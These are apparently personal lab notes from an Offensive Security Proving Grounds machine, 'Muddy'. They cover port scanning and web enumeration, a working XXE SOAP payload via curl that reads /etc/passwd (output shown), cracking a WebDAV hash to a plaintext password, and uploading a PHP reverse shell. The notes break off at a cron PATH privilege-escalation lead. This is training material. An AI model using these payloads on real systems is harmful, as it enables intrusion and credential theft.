---
tags: [ProvingGround]
---

Muddy 6/28/25

------------------------------------------

## 1. sudo nmap -p- -sC -sV -Pn -n --open 192.168.180.161 -oN nmap/initial
Nmap scan report for 192.168.180.161
Host is up (0.082s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
25/tcp   open  smtp          Exim smtpd
| smtp-commands: muddy Hello nmap.scanme.org [192.168.45.226], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://muddy.ugc/
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  https?
808/tcp  open  ccproxy-http?
908/tcp  open  unknown
8888/tcp open  http          WSGIServer 0.1 (Python 2.7.16)
|_http-title: Ladon Service Catalog
|_http-server-header: WSGIServer/0.1 Python/2.7.16
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## 2. Port 25 SMTP Inestigation
- Running Exim.
- nc 192.168.180.161 25
## 220 muddy ESMTP Exim 4.92 Thu, 26 Jun 2025 13:25:33 -0400
- Looks like that version of Exim is vulnerable to CVE-2019-16928. No exploits clearly available.

## 3. Port 80 HTTP.
- http://192.168.180.161 redirts to http://muddy.ugc/
- Ran nikto
+ Server: Apache/2.4.38 (Debian)
+ /: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ Root page / redirects to: http://muddy.ugc/
+ /index.php?: Drupal Link header found with value: <http://muddy.ugc/>; rel=shortlink. See: https://www.drupal.org/
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ 8254 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2025-06-26 12:16:41 (GMT-6) (676 seconds)

- Found version of Wordpress by visiting http://192.168.180.161/wp-links-opml.php. Version 5.7.
- gobuster dir -u http://192.168.180.161 -w /usr/share/seclists/Discovery/Web-Content/common.txt
/index.php            (Status: 200) [Size: 19205]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.180.161/javascript/]
/wp-admin             (Status: 301) [Size: 321] [--> http://192.168.180.161/wp-admin/]
/wp-content           (Status: 301) [Size: 323] [--> http://192.168.180.161/wp-content/]
/wp-includes          (Status: 301) [Size: 324] [--> http://192.168.180.161/wp-includes/]
/webdav               (Status: 401)
- Added http://muddy.ugc to /etc/hosts file
- Accessed site appears to be a blog with search function
- Went to http://muddy.ugc/webdav prompted for username/password

## 4. 443 Investigation.
- Went to https://192.168.180.161. Unable to connect.
- nc 192.168.180.161 443
(UNKNOWN) [192.168.180.161] 443 (https) : Connection refused

## 5. 808 and 908 Investigation
- Unable to connect to either port.

## 6. Port 8888 investigation.
- Running a Ladon Service Catalog
- Found an exploit on exploit DB https://www.exploit-db.com/exploits/43113
- curl -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://muddy.ugc:8888/muddy/soap11/checkout' | xmllint --format -
<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:muddy" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<ns:checkoutResponse>
<result>Serial number: root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/falseian:x:1000:1000::/home/ian:/bin/shDebian-exim:x:107:114::/var/spool/exim4:/usr/sbin/nologin_rpc:x:108:65534::/run/rpcbind:/usr/sbin/nologinstatd:x:109:65534::/var/lib/nfs:/usr/sbin/nologin</result>
</ns:checkoutResponse>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
- After successfully running POC and getting etc/passwd file, tried by to access webdav file at /etc/apached2/passwd.dav
- Found administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0
- john --format=md5crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
sleepless        (administrant)
- Created php backdoor using https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- Added file to webdav folder curl -T php-reverse-shell2.php http://muddy.ugc/webdav/ --user administrant:sleepless
- Executed file and received and reverse shell as www-data

## 7. Priviledged esculation
- cat /etc/crontab shows netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
- netstat is run without an absolute path.
-